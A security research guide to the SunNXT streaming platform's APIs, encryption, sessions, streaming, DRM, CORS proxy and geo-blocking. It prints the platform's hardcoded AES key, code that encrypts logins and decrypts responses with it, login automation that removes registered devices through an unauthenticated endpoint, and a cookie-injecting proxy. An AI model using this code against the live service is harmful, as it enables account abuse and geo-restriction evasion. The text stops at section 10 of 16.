# Complete Learning Guide — SunNXT Security Research

**Author: Nitheesh D R**
**Date: May 22, 2026**
**Type: Security Research & OTT Platform Internals**

---

> This is a single, complete reference document. Read it top to bottom once to understand the full picture, then use the section headers to jump back to specific topics.

---

## Table of Contents

1. [What Is This Project?](#1-what-is-this-project)
2. [How an OTT Platform Works (Big Picture)](#2-how-an-ott-platform-works-big-picture)
3. [SunNXT's Architecture — Reverse Engineered](#3-sunnxts-architecture--reverse-engineered)
4. [All API Endpoints — Complete Reference](#4-all-api-endpoints--complete-reference)
5. [How the Encryption Works](#5-how-the-encryption-works)
6. [How Login and Sessions Work](#6-how-login-and-sessions-work)
7. [How Video Streaming Works (DASH & HLS)](#7-how-video-streaming-works-dash--hls)
8. [How DRM Works (Widevine, PlayReady, FairPlay)](#8-how-drm-works-widevine-playready-fairplay)
9. [How CORS Is Bypassed (The Proxy Layer)](#9-how-cors-is-bypassed-the-proxy-layer)
10. [How Geo-Blocking Works](#10-how-geo-blocking-works)
11. [All 10 Vulnerabilities — How They Happen & How to Fix](#11-all-10-vulnerabilities--how-they-happen--how-to-fix)
12. [The Complete Request Flow — Step by Step](#12-the-complete-request-flow--step-by-step)
13. [Code Reference — Every Key Function Explained](#13-code-reference--every-key-function-explained)
14. [Security Testing Methodology](#14-security-testing-methodology)
15. [OWASP Top 10 Mapping](#15-owasp-top-10-mapping)
16. [Glossary](#16-glossary)

---

## 1. What Is This Project?

### The Problem Statement

SunNXT is an Indian OTT platform. Like Netflix, it uses:
- Encrypted APIs to exchange data
- Session cookies to authenticate users
- CDN (Content Delivery Network) to serve video
- DRM to prevent downloading

As a security researcher, you want to understand and test all these layers. The problem: testing from a browser alone is limited — you can observe requests in DevTools, but you cannot automate, replay, or deeply inspect them.

### The Solution

Build a **programmable client** that mimics SunNXT's own web app. This client:
1. Knows the encryption key → can decrypt all API responses
2. Manages sessions automatically → can test any session state
3. Proxies all requests through a server → bypasses browser CORS restrictions
4. Integrates Shaka Player → can test DRM flows end-to-end

### What Was Found

During this project, **10 security vulnerabilities** were discovered:
- 1 High severity
- 5 Medium severity
- 2 Low severity
- 2 Informational

The most critical: SunNXT's AES-128 encryption key is **hardcoded in their client-side JavaScript** — shipped to every browser. The "encryption" of login credentials is cosmetic.

---

## 2. How an OTT Platform Works (Big Picture)

Before diving into SunNXT specifically, understand the general architecture of any OTT streaming platform:

```
┌──────────────────────────────────────────────────────────────────┐
│                          USER DEVICE                              │
│                                                                   │
│   Browser / App                                                   │
│   ┌─────────────────────────────────────────────────────────┐    │
│   │  1. Load UI (HTML/CSS/JS)                               │    │
│   │  2. Browse catalogue (API calls)                        │    │
│   │  3. Click Play → Request stream URL                     │    │
│   │  4. Video player loads manifest (.mpd or .m3u8)        │    │
│   │  5. Player downloads segments + decrypts with DRM       │    │
│   └─────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────┘
         │                              │
   API calls                     CDN requests
   (HTTPS, JSON)                 (video segments)
         │                              │
         ▼                              ▼
┌─────────────────┐           ┌────────────────────┐
│   Origin Server  │           │   CDN Edge Servers  │
│  (sunnxt.com)    │           │  (Akamai, CloudFront│
│                  │           │   Fastly, etc.)     │
│  - Auth          │           │                     │
│  - Catalogue     │           │  - Geo-distributed  │
│  - Stream URLs   │           │  - Low latency      │
│  - User data     │           │  - High bandwidth   │
└─────────────────┘           └────────────────────┘
         │
         ▼
┌─────────────────┐
│  DRM License    │
│  Server         │
│  (Nagravision)  │
│                 │
│  - Issues keys  │
│  - Validates    │
│    subscription │
└─────────────────┘
```

### The Three Planes

1. **Control Plane** — API calls (authentication, browsing, getting stream URLs). These require your session cookie. Relatively low data volume.

2. **Data Plane** — CDN requests (video segments, images). High data volume, served from edge servers close to the user.

3. **DRM Plane** — License requests (getting keys to decrypt video). Small binary blobs. Happens once per play session.

---

## 3. SunNXT's Architecture — Reverse Engineered

After analysis, SunNXT's platform has these components:

### Frontend
- React SPA (Single Page Application)
- Shaka Player for video playback
- Client-side AES encryption (vulnerability — see Section 11)

### API Layer

| Domain | Purpose |
|---|---|
| `www.sunnxt.com/next/api/` | Core API (login, media, logout) |
| `pwaapi.sunnxt.com/` | Browse/search API (no auth required) |
| `api.sunnxt.com/` | Device management + DRM license proxy |

### CDN Layer

| Domain | Purpose |
|---|---|
| `livestream.sunnxt.com` | Live TV DASH streams |
| `suntvvod1.sunnxt.com` | VOD PlayReady + FairPlay streams |
| `movies1-suntvvod.akamaized.net` | VOD Widevine DASH (Akamai) |
| `movies2-suntvvod.akamaized.net` | VOD Widevine DASH alternate (Akamai) |

### DRM Layer

| Domain | Purpose |
|---|---|
| `api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/` | Widevine + PlayReady licenses |
| `api.sunnxt.com/licenseproxy/v3/fairplayDRMProxy/` | FairPlay licenses (Safari) |

### Our Proxy Architecture

```
Browser (React UI + Shaka Player)
        │
        │  All requests → same origin (localhost:3000 or vercel.app)
        ▼
Next.js Server (Vercel, Mumbai region)
        │
        ├──→  www.sunnxt.com      (login, media resolution)
        ├──→  pwaapi.sunnxt.com   (browse, search)
        ├──→  *.akamaized.net     (CDN segments, proxied)
        ├──→  suntvvod1.sunnxt.com (CDN segments, proxied)
        └──→  api.sunnxt.com      (DRM license, device mgmt)
```

The browser **never contacts SunNXT directly**. Every request — auth, content, CDN, DRM — goes through our Next.js server which injects the session cookie.

---

## 4. All API Endpoints — Complete Reference

### Authentication APIs

#### POST `/next/api/login`
**Purpose:** Log in with encrypted credentials

**Request:**
```
POST https://www.sunnxt.com/next/api/login
Content-Type: application/x-www-form-urlencoded

payload=<AES_ENCRYPTED_BASE64>&version=1
```

**Payload before encryption:**
```json
{ "userid": "9876543210", "password": "yourpassword" }
```

**Required headers:**
```
x-myplex-platform: browser
x-ucv: 5
origin: https://www.sunnxt.com
referer: https://www.sunnxt.com/
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...
```

**Response codes:**
```
200 → Login successful → sets sessionid cookie
423 → Device limit reached → includes ManageDevices URL in body
401 → Wrong credentials
```

**Successful response (after decrypt):**
```json
{
  "code": 200,
  "status": "OK",
  "sessionid": "abc123...",
  "login_account_type": "subscriber",
  "subscription_status": "Active"
}
```

---

#### POST `/next/api/logout`
**Purpose:** Invalidate the current session

```
POST https://www.sunnxt.com/next/api/logout
Cookie: sessionid=abc123...
```

---

#### GET `/next/api/status` (Account status)
**Purpose:** Check if a mobile number has a SunNXT account

```
GET https://www.sunnxt.com/next/api/status?mobile=9876543210
```

**Response:**
```json
{
  "code": 200,
  "user_available": true,
  "login_account_type": "subscriber",
  "subscription_status": "Active"
}
```

---

### Content / Browse APIs

#### GET Browse Carousel
**Purpose:** Get homepage content rows (no auth required)

```
GET https://pwaapi.sunnxt.com/content/v7/browse
  ?contentlanguage=tamil,telugu,hindi,kannada,malayalam
  &tvodcategoryId=Movies
  &limit=20
  &offset=0
```

**Response:**
```json
{
  "code": 200,
  "results": [
    {
      "title": "Trending Movies",
      "items": [
        {
          "_id": "82850",
          "globalServiceName": "Ponniyin Selvan",
          "images": { "landscape": [...], "poster": [...] }
        }
      ]
    }
  ]
}
```

---

#### GET Search
**Purpose:** Search content (no auth required)

```
GET https://pwaapi.sunnxt.com/content/v7/search
  ?query=ponniyin
  &type=movies
  &contentlanguage=tamil
  &limit=20
```

---

#### GET Content Detail
**Purpose:** Get metadata for a specific item (no auth required)

```
GET https://pwaapi.sunnxt.com/content/v7/contents/82850
  ?fields=generalInfo,images,relatedCast,subtitles,genreInfo
  &contentlanguage=tamil
```

---

#### GET Live Channels
**Purpose:** List all live TV channels (no auth required)

```
GET https://pwaapi.sunnxt.com/channel/v1/liveChannels
  ?contentlanguage=tamil,telugu
```

---

### Media / Stream APIs

#### GET `/next/api/media/{contentId}`
**Purpose:** Resolve stream URLs for playback (auth required)

```
GET https://www.sunnxt.com/next/api/media/82850
  ?playbackCounter=1
  &fields=contents,user/currentdata,images,generalInfo,subtitles,
          relatedCast,globalServiceName,globalServiceId,
          relatedMedia,videos,thumbnailSeekPreview
  &bw=5000000
  &nid=4
Cookie: sessionid=abc123...
```

**Parameter notes:**
- `bw=5000000` — request 5 Mbps bandwidth → server returns HD CDN URLs
- `nid=4` — network type 4 = WiFi → gets best quality
- Without these params, you often get SD/empty URLs

**Response (after decrypt):**
```json
{
  "code": 200,
  "results": [
    {
      "globalServiceName": "Ponniyin Selvan",
      "generalInfo": {
        "title": "Ponniyin Selvan: Part 1",
        "type": "movie",
        "description": "...",
        "isDolby": true
      },
      "videos": {
        "values": [
          {
            "format": "hls-fp-aapl",
            "link": "https://suntvvod1.sunnxt.com/.../hd_index.m3u8?hdntl=...",
            "licenseUrl": "https://api.sunnxt.com/licenseproxy/v3/fairplayDRMProxy/?...",
            "profile": "hd"
          },
          {
            "format": "dash-cenc",
            "link": "https://suntvvod1.sunnxt.com/.../hd_index.mpd?hdntl=...",
            "licenseUrl": "https://api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/?content_id=82850&token=<JWT>",
            "profile": "hd"
          },
          {
            "format": "dash",
            "link": "https://movies2-suntvvod.akamaized.net/movies2/.../82850_hd.mpd?hdntl=exp=1779436600~acl=...",
            "profile": "hd"
          }
        ]
      },
      "images": { ... },
      "relatedCast": { "values": [...] }
    }
  ]
}
```

**Error responses:**

Video unavailable (content not streamable):
```json
{ "videos": { "status": "ERR_UPSTREAM_SERVER_ERROR", "message": "Video is not available" } }
```

Geo-blocked (returned as HTTP 200 — see VULN-09):
```json
{
  "code": 200,
  "results": [{
    "blocked_reason": "roaming_expired_30",
    "title": "International Roaming Expired",
    "p1": "International access expired.",
    "p2": "Paid content accessible when you return to India."
  }]
}
```

---

### Device Management APIs

#### GET ManageDevices (after 423 login response)
**Purpose:** View registered devices — VULNERABLE (no session auth)

```
GET https://www.sunnxt.com/managedevices?token=<URL_TOKEN>
```

Returns HTML with device IDs in `removeDevice` links.

---

#### GET removeDevice
**Purpose:** Remove a registered device — VULNERABLE (no CSRF)

```
GET https://api.sunnxt.com/user/v4/removeDevice/
  ?token=<URL_TOKEN>
  &deviceId=456789
  &redirectUrl=
```

No session cookie required. No CSRF token. Immediately removes device.

---

### DRM License API

#### POST Nagravision DRM Proxy
**Purpose:** Get Widevine or PlayReady license

```
POST https://api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/
  ?content_id=82850
  &token=<SIGNED_JWT>
Content-Type: application/octet-stream
Cookie: sessionid=abc123...
Body: <binary Widevine/PlayReady challenge from browser CDM>
```

**JWT structure (decoded):**
```json
{
  "content_id": "82850",
  "maxUses": 2,
  "device": "web",
  "userId": "2750313",
  "expiryTime": 1779436600,
  "ip_address": "157.51.128.36",
  "video_format": "dash-cenc"
}
```

Response: Binary DRM license (forwarded directly to Shaka Player)

---

### Heartbeat API

#### POST Heartbeat
**Purpose:** Track watch session start/stop

```
POST https://www.sunnxt.com/next/api/heartbeat  (or equivalent)
Content-Type: application/json
Cookie: sessionid=abc123...
Body: { "contentId": "82850", "action": "Start" }
```

Called every 30 seconds during playback. Stops on pause/end.

---

## 5. How the Encryption Works

### Why SunNXT Uses Encryption

SunNXT added AES encryption on top of HTTPS. Their stated reason: protect credentials even if TLS is stripped. The actual result: a false sense of security because the key is public.

### AES-128-CBC — The Algorithm

AES (Advanced Encryption Standard) with 128-bit key in CBC (Cipher Block Chaining) mode:

```
ENCRYPTION:
┌──────────┐   ┌──────────┐   ┌──────────┐
│Plaintext │   │Plaintext │   │Plaintext │
│ Block 1  │   │ Block 2  │   │ Block 3  │
└────┬─────┘   └────┬─────┘   └────┬─────┘
     │              │              │
     XOR(IV)        XOR(C1)       XOR(C2)   ← CBC: each block XORed with previous cipher
     │              │              │
   AES(K)         AES(K)         AES(K)
     │              │              │
     ▼              ▼              ▼
┌──────────┐   ┌──────────┐   ┌──────────┐
│Cipher C1 │   │Cipher C2 │   │Cipher C3 │
└──────────┘   └──────────┘   └──────────┘
```

### SunNXT's Key and IV

```
Key: "A3s68aORSgHs$71P"  (16 bytes = 128 bits)
IV:  "00000000000000000000000000000000"  (32 hex chars = 16 bytes of zeros)
```

**Both values are hardcoded in SunNXT's client-side JavaScript.**

### Encrypting a Login Payload (TypeScript)

```typescript
import CryptoJS from "crypto-js";

const MEDIA_KEY = "A3s68aORSgHs$71P";

function encryptPayload(obj: Record<string, string>): string {
  const keyWA = CryptoJS.enc.Utf8.parse(MEDIA_KEY);
  const iv    = CryptoJS.enc.Hex.parse("00000000000000000000000000000000");

  const encrypted = CryptoJS.AES.encrypt(JSON.stringify(obj), keyWA, {
    iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });

  return encrypted.toString(); // returns Base64 string
}

// Example:
const payload = encryptPayload({ userid: "9876543210", password: "mypassword" });
// → "Uk3pA4+Q0z2B+...base64..."

const body = `payload=${encodeURIComponent(payload)}&version=1`;
```

### Decrypting an API Response (TypeScript)

```typescript
function decrypt(ciphertext: string): unknown {
  const keyWA = CryptoJS.enc.Utf8.parse(MEDIA_KEY);
  const iv    = CryptoJS.enc.Hex.parse("00000000000000000000000000000000");

  const bytes = CryptoJS.AES.decrypt(ciphertext, keyWA, {
    iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });

  // CryptoJS → hex → Buffer → UTF-8 string → JSON
  const hex = bytes.toString(CryptoJS.enc.Hex);
  return JSON.parse(Buffer.from(hex, "hex").toString("utf8"));
}
```

### Why This Is a Vulnerability

```
Normal secure system:
  Key lives ONLY on server → attacker cannot decrypt traffic
  
SunNXT:
  Key is in client JS → attacker opens DevTools → finds key in 30 seconds
  → Can decrypt all login requests intercepted on network
  → Can decrypt all API responses
```

**How to find the key in DevTools:**
1. Open `https://www.sunnxt.com`
2. F12 → Sources → Ctrl+Shift+F (search all files)
3. Search: `CryptoJS.AES.encrypt`
4. Key appears next to the function call

**The correct fix:** Remove application-layer encryption entirely — HTTPS already encrypts the connection. If AES is kept, the key must never be in client code (use server-side challenge-response: client asks server for a public key, encrypts with it, server decrypts with private key).

---

## 6. How Login and Sessions Work

### The Two-Step Login Flow

SunNXT uses a two-step approach to minimize failed login attempts:

```
Step 1: Check Account
User enters mobile number
  → GET /next/api/status?mobile=9876543210
  ← Response: { user_available: true, subscription_status: "Active" }
  → Show password input

Step 2: Authenticate
User enters password
  → POST /next/api/login (encrypted payload)
  ← Response: Set-Cookie: sessionid=abc123...; HttpOnly; Secure
  → Redirect to home
```

### Session Cookie Properties

```
Set-Cookie: sessionid=abc123...xyz
            HttpOnly    ← JS cannot read this (XSS protection)
            Secure      ← Only sent over HTTPS
            SameSite=Lax ← Not sent on cross-site GET requests
```

### Server-Side Session Cache

Our Next.js server maintains a cached session to avoid logging in on every request:

```typescript
// lib/sunnxt-session.ts

let cachedCookies = "";
let loginPromise: Promise<string> | null = null;

export async function getSunnxtCookies(): Promise<string> {
  // Return cached session immediately if available
  if (cachedCookies) return cachedCookies;

  // Deduplicate concurrent login attempts
  // (prevents 10 simultaneous requests from each triggering a login)
  if (!loginPromise) {
    loginPromise = doLogin().finally(() => { loginPromise = null; });
  }
  return loginPromise;
}

export function invalidateSession() {
  cachedCookies = "";  // Force fresh login on next request
}
```

### Device Limit Handling (Code 423)

When the device limit is hit:

```typescript
async function doLogin(): Promise<string> {
  const first = await attemptLogin();

  if (first.response.code === 200) {
    cachedCookies = first.cookies;
    return cachedCookies;
  }

  if (first.response.code === 423) {
    // Extract ManageDevices URL from response
    const manageUrl = first.response.ui?.buttons
      ?.find((b) => b.action === "webView")?.buttonAction;
    const token = manageUrl?.match(/token=([^&]+)/)?.[1];

    if (token && manageUrl) {
      // Fetch device list HTML
      const html = await (await fetch(manageUrl, { cookie: first.cookies })).text();

      // Parse device IDs from removeDevice links
      const deviceIds = [...html.matchAll(/removeDevice[^"']*deviceId=(\d+)/g)]
        .map((m) => m[1]);

      if (deviceIds.length > 0) {
        // Remove first stale device
        await removeDevice(token, deviceIds[0]);
        // Retry login
        const second = await attemptLogin();
        if (second.response.code === 200) {
          cachedCookies = second.cookies;
          return cachedCookies;
        }
      }
    }
    throw new Error("Device limit — could not free a slot");
  }

  throw new Error(`Login failed: ${first.response.code}`);
}
```

**Security note (VULN-03):** The `removeDevice` endpoint accepts just a URL token — no session validation. This means any code that has the token (extracted from a 423 response) can remove devices without being the account owner.

### Session Invalidation Flow

```
Session becomes stale (401 from SunNXT API)
  ↓
invalidateSession() clears cachedCookies
  ↓
Next getSunnxtCookies() call triggers fresh login
  ↓
New sessionid obtained → cached → all subsequent requests succeed
```

---

## 7. How Video Streaming Works (DASH & HLS)

### The Problem with Traditional Video Delivery

Old approach: serve one video file at one quality. Problems:
- User on slow connection buffers on high-quality video
- User on fast connection gets poor quality on low-quality video
- A single file is too large to fast-forward without downloading everything

### Adaptive Bitrate Streaming (ABR)

Modern OTT solution: encode the same video at multiple quality levels, split into small segments (2–6 seconds each), and let the player switch quality on the fly.

```
One movie → encoded at: 240p, 360p, 480p, 720p, 1080p
Each quality → split into 2-second segments
Player monitors: download speed, buffer health
Player decides: "I'm getting 3 Mbps → switch to 720p"
                "Buffer is low → drop to 480p"
```

### MPEG-DASH

DASH (Dynamic Adaptive Streaming over HTTP) uses an XML manifest called MPD (Media Presentation Description):

```xml
<?xml version="1.0"?>
<MPD xmlns="urn:mpeg:dash:schema:mpd:2011" type="static" mediaPresentationDuration="PT7200S">
  
  <BaseURL>https://movies2-suntvvod.akamaized.net/movies2/82850/</BaseURL>
  
  <Period>
    <!-- Video track with multiple quality levels -->
    <AdaptationSet mimeType="video/mp4" codecs="avc1.640028">
      
      <ContentProtection schemeIdUri="urn:uuid:EDEF8BA9-79D6-4ACE-A3C8-27DCD51D21ED">
        <cenc:pssh>AAAATHR...</cenc:pssh>  <!-- Widevine PSSH box -->
      </ContentProtection>
      
      <Representation id="720p" bandwidth="2500000" width="1280" height="720">
        <SegmentTemplate
          initialization="video_720p_init.mp4"
          media="video_720p_$Number$.mp4"
          startNumber="1" duration="2" timescale="1"/>
      </Representation>
      
      <Representation id="1080p" bandwidth="5000000" width="1920" height="1080">
        <SegmentTemplate
          initialization="video_1080p_init.mp4"
          media="video_1080p_$Number$.mp4"
          startNumber="1" duration="2" timescale="1"/>
      </Representation>
      
    </AdaptationSet>
    
    <!-- Audio track -->
    <AdaptationSet mimeType="audio/mp4" codecs="mp4a.40.2" lang="ta">
      <Representation id="audio" bandwidth="128000">
        <SegmentTemplate initialization="audio_init.mp4" media="audio_$Number$.mp4"/>
      </Representation>
    </AdaptationSet>
    
  </Period>
</MPD>
```

### HLS

HLS (HTTP Live Streaming, Apple's format) uses `.m3u8` text files:

**Master playlist** (`hd_index.m3u8`):
```m3u8
#EXTM3U
#EXT-X-VERSION:3

#EXT-X-STREAM-INF:BANDWIDTH=2500000,RESOLUTION=1280x720
720p/playlist.m3u8

#EXT-X-STREAM-INF:BANDWIDTH=5000000,RESOLUTION=1920x1080
1080p/playlist.m3u8
```

**Quality playlist** (`720p/playlist.m3u8`):
```m3u8
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:6
#EXT-X-KEY:METHOD=AES-128,URI="https://keyserver.sunnxt.com/key/12345",IV=0x00000001

#EXTINF:6.0,
segment_001.ts
#EXTINF:6.0,
segment_002.ts
```

### DASH vs HLS Comparison

| Feature | DASH | HLS |
|---|---|---|
| Standard | ISO/MPEG | Apple |
| Manifest format | XML (.mpd) | Text (.m3u8) |
| DRM | Any (via CENC) | FairPlay (Apple) or AES-128 |
| Browser support | Chrome, FF, Edge | All (native in Safari) |
| Used in SunNXT | Yes (Widevine, PlayReady) | Yes (FairPlay, AES-128) |

### Why CORS Blocks CDN Requests

SunNXT's CDN domains (`*.akamaized.net`, `suntvvod1.sunnxt.com`) don't send `Access-Control-Allow-Origin` headers. This means:

```
JavaScript on localhost:3000 tries to:
  fetch("https://movies2-suntvvod.akamaized.net/movies/82850_hd.mpd")
  
Browser checks: does akamaized.net allow localhost:3000?
  → No Access-Control-Allow-Origin header
  → Browser blocks the response ✗
```

Our stream proxy solves this by making the request **server-side** (Node.js doesn't have CORS restrictions), then adding the CORS header to our response.

### The DASH BaseURL Injection Trick

DASH segments use relative paths. After proxying a manifest, relative paths would be wrong:

```xml
<!-- Original MPD segment template -->
<SegmentTemplate media="video_$Number$.mp4"/>
<!-- Relative to: https://movies2-suntvvod.akamaized.net/movies/82850/ -->

<!-- After proxying, the browser sees it from: http://localhost:3000/api/stream-proxy?url=... -->
<!-- Relative resolution would be WRONG -->
```

Solution: inject a `<BaseURL>` tag into the MPD pointing to the upstream CDN URL:

```typescript
function rewriteMpd(xml: string, manifestUrl: string): string {
  const baseDir = manifestUrl.substring(0, manifestUrl.lastIndexOf("/") + 1);
  const baseUrlTag = `<BaseURL>${baseDir}</BaseURL>`;
  return xml.replace(/(<MPD[^>]*>)/, `$1\n  ${baseUrlTag}`);
}
```

Now Shaka resolves segment URLs as:
`https://movies2-suntvvod.akamaized.net/movies/82850/video_001.mp4`

Our request filter intercepts that and re-routes through the proxy:
`/api/stream-proxy?url=https%3A%2F%2Fmovies2-suntvvod.akamaized.net%2F...`

---

## 8. How DRM Works (Widevine, PlayReady, FairPlay)

### What DRM Does

DRM ensures that even if someone has a video file, they cannot play it without a valid license. The video is encrypted with a **content key (CK)** — a random 128-bit secret. To decrypt and watch, your device must:
1. Prove it's a legitimate device (device certificate)
2. Prove you have a valid subscription (account check)
3. Receive the content key encrypted for your specific device

### The Three DRM Systems in SunNXT

| System | Owner | Works In | Encryption |
|---|---|---|---|
| Widevine | Google | Chrome, Firefox, Android | AES-128-CTR (CENC) |
| PlayReady | Microsoft | Edge, Internet Explorer | AES-128-CTR (CENC) |
| FairPlay | Apple | Safari, iOS, tvOS | AES-128-CBC |

### Complete Widevine License Flow

```
1. Shaka loads encrypted MPD
           │
           ▼
2. Shaka reads PSSH box from ContentProtection element
   PSSH contains: KID (Key ID) + Widevine-specific init data
           │
           ▼
3. Browser's Widevine CDM generates a License Challenge
   Challenge contains:
     - Device certificate (proves legitimacy)
     - KID (which key is being requested)
     - Session policy request
           │
           ▼
4. Shaka fires 'message' event with challenge binary
   Challenge is sent to license server URL:
     POST /api/license?url=https://api.sunnxt.com/licenseproxy/...
     Body: <binary challenge>
           │
           ▼
5. Our /api/license route:
   - Attaches SunNXT session cookie
   - Forwards binary challenge to Nagravision
           │
           ▼
6. Nagravision validates:
   - Is device certificate legitimate? (checks with Google Widevine servers)
   - Is JWT token valid? (content_id, userId, expiry, ip_address)
   - Does userId have an active subscription?
           │
           ▼
7. Nagravision returns binary license
   License contains: Content Key (CK) encrypted for THIS SPECIFIC DEVICE
           │
           ▼
8. Shaka calls session.update(license)
   CDM decrypts the license → extracts CK
   CK never leaves the CDM (stays in hardware/secure memory)
           │
           ▼
9. CDM decrypts video segments with CK
   Decoded frames sent to video element
           │
           ▼
10. Video plays ✓
```

### The PSSH Box

```
PSSH = Protection System Specific Header

Binary structure:
┌────────────────────────────────────────────────────────────────┐
│ 4 bytes: box size                                              │
│ 4 bytes: "pssh" (box type identifier)                         │
│ 1 byte:  version                                               │
│ 3 bytes: flags                                                 │
│ 16 bytes: System ID (UUID)                                     │
│           Widevine:  EF8BA9... (edef8ba9-79d6-4ace-a3c8-...)  │
│           PlayReady: 9A04F079... (9a04f079-9840-4286-ab92-...) │
│ 4 bytes: data size                                             │
│ N bytes: system-specific data                                  │
│          (Widevine: protobuf with content_id, key_ids, policy) │
└────────────────────────────────────────────────────────────────┘
```

In the MPD, this is base64-encoded inside `<cenc:pssh>`:
```xml
<cenc:pssh>AAAATHBzc2gAAAAA7e+LqXnWSs6jyCfc1R0h7QAAAEQIARIQjNrM...</cenc:pssh>
```

### Widevine Security Levels

```
L1 (Hardware):
  ┌─────────────────────────────────────────────────────┐
  │  Trusted Execution Environment (TEE)                 │
  │  - Widevine CDM runs here                           │
  │  - Content key NEVER leaves TEE                     │
  │  - Video decoded in hardware                        │
  │  → Used in: Android phones, Chromecast, Smart TVs   │
  │  → Quality: up to 4K allowed                        │
  └─────────────────────────────────────────────────────┘

L3 (Software):
  ┌─────────────────────────────────────────────────────┐
  │  Browser process                                     │
  │  - Widevine CDM is a software plugin                │
  │  - Content key in software memory                   │
  │  - Theoretically extractable (very hard in practice)│
  │  → Used in: Desktop Chrome, Firefox                 │
  │  → Quality: often capped at 720p by license server  │
  └─────────────────────────────────────────────────────┘
```

### CENC — One Encrypted File, Multiple DRM Systems

```
Content Key K = random 128-bit secret
Video segments encrypted with K using AES-128-CTR

MPD contains:
  PlayReady PSSH → K wrapped for PlayReady  ← Edge/IE uses this
  Widevine PSSH  → K wrapped for Widevine   ← Chrome uses this
  
Same segments, same K, different PSHHs for different DRM systems.
```

### SunNXT's 14 Stream Formats for a Premium Movie

| # | Format | Domain | DRM | CDN Access (no session) |
|---|---|---|---|---|
| 1 | `dash-cenc` HD | suntvvod1.sunnxt.com | PlayReady | HTTP 200 ✓ |
| 2 | `hls-fp-aapl` HD | suntvvod1.sunnxt.com | FairPlay | HTTP 200 ✓ |
| 3 | `wvm` 1080p | Akamai | Widevine Classic | HTTP 200 ✓ |
| 4 | `wvm` 720p | Akamai | Widevine Classic | HTTP 200 ✓ |
| 5 | `wvm` 480p | Akamai | Widevine Classic | HTTP 200 ✓ |
| 6 | `wvm` 360p | Akamai | Widevine Classic | HTTP 200 ✓ |
| 7 | `hlsaes` Low | suntvvod1.sunnxt.com | AES-128 | HTTP 403 ✗ |
| 8 | `dash` HD | Akamai | Widevine CENC | HTTP 200 ✓ |
| 9 | `dash` HD alt | Akamai | Widevine CENC | HTTP 200 ✓ |
| 10–14 | `dash` SD variants | Akamai | Widevine CENC | HTTP 200 ✓ |

**Key finding:** CDN segments return 200 without session — but ALL premium content is CENC-encrypted. A 200 response without a DRM license is useless — you cannot decrypt the segments.

### Nagravision JWT Structure (Security Issue)

```json
{
  "content_id": "82850",
  "maxUses": 2,
  "device": "web",
  "userId": "2750313",
  "expiryTime": 1779436600,
  "ip_address": "157.51.128.36",
  "video_format": "dash-cenc"
}
```

**VULN-08:** `ip_address` is the Next.js **server's IP** (157.51.128.36), not the user's browser IP. IP binding is meant to prevent JWT sharing but it's completely ineffective when requests go through a server proxy — all requests appear to come from the proxy IP.

---

## 9. How CORS Is Bypassed (The Proxy Layer)

### What CORS Is

Same-Origin Policy (SOP) is a browser security rule: JavaScript on `page-A.com` cannot read responses from `page-B.com` unless page-B explicitly allows it via CORS headers.

```
Your page: http://localhost:3000
CDN:       https://movies2-suntvvod.akamaized.net

Browser blocks:
  fetch("https://movies2-suntvvod.akamaized.net/82850_hd.mpd")
  Error: "Access to fetch has been blocked by CORS policy:
          No 'Access-Control-Allow-Origin' header"
```

### Why This Doesn't Apply Server-Side

CORS is a **browser** restriction. Node.js (and any server) has no such restriction. Our Next.js server can freely call any URL.

```
Browser → /api/stream-proxy?url=https://movies2-suntvvod.akamaized.net/82850_hd.mpd
                    │
                    │ (same origin — no CORS issue)
                    ▼
Next.js Server → fetch("https://movies2-suntvvod.akamaized.net/82850_hd.mpd")
                    │ (server-to-server — no CORS restriction)
                    │
                    ▼
                 Response received
                    │
                    ▼
Next.js adds:  Access-Control-Allow-Origin: *
                    │
                    ▼
Browser receives response ✓
```

### The Stream Proxy Implementation

```typescript
// app/api/stream-proxy/route.ts

const ALLOWED_HOSTS = [
  "livestream.sunnxt.com",
  "suntvvod1.sunnxt.com",
  "sunnxt.com",
  "akamaized.net",  // only allowed if hostname includes "suntvvod"
];

export async function GET(request: NextRequest) {
  const url = request.nextUrl.searchParams.get("url");
  const hostname = new URL(url).hostname;

  // Security check: only proxy SunNXT domains
  const allowed = ALLOWED_HOSTS.some((h) => hostname.endsWith(`.${h}`)) &&
    (hostname.endsWith(".akamaized.net") ? hostname.includes("suntvvod") : true);
  
  if (!allowed) return new NextResponse("Domain not allowed", { status: 403 });

  // Fetch upstream with auth cookie
  const cookie = await getSunnxtCookies().catch(() => "");
  const upstream = await fetch(url, { headers: { ...DEFAULT_HEADERS, cookie } });

  // For DASH manifests: inject BaseURL so relative segment paths resolve correctly
  if (url.endsWith(".mpd")) {
    const xml = await upstream.text();
    const baseDir = url.substring(0, url.lastIndexOf("/") + 1);
    const rewritten = xml.replace(/(<MPD[^>]*>)/, `$1\n  <BaseURL>${baseDir}</BaseURL>`);
    return new NextResponse(rewritten, {
      headers: {
        "content-type": "application/dash+xml",
        "access-control-allow-origin": "*",
      },
    });
  }

  // For video segments: stream directly (don't buffer)
  return new NextResponse(upstream.body, {
    headers: {
      "content-type": upstream.headers.get("content-type"),
      "access-control-allow-origin": "*",
    },
  });
}
```

### How the Player Uses the Proxy

Shaka Player has a "request filter" — a hook called before every network request:

```typescript
player.getNetworkingEngine().registerRequestFilter((_type, request) => {
  const url: string = request.uris[0];
  
  // Skip if already going through proxy
  if (url.includes("/api/stream-proxy")) return;
  
  // Re-route all SunNXT CDN requests through proxy
  if (isSunnxtCdnUrl(url)) {
    request.uris[0] = `/api/stream-proxy?url=${encodeURIComponent(url)}`;
  }
});
```

This means even segment URLs discovered inside the manifest (like `video_001.mp4`) are automatically re-routed through our proxy.

---

## 10. How Geo-Blocking Works

### SunNXT's Geo-Restriction Model

SunNXT restricts paid content to Indian IP addresses. The check happens at **session creation** (login), not per-request.

```
Indian IP login:
  POST /next/api/login from 103.21.x.x (Mumbai)
  → session created with geo_flag = "IN"
  → session stored server-side

Non-Indian IP with Indian-origin session:
  GET /next/api/media/82850
  Cookie: sessionid=<session_created_from_Mumbai>
  → server checks session.geo_flag = "IN"
  → returns stream URLs ✓ (never re-checks current IP)
```

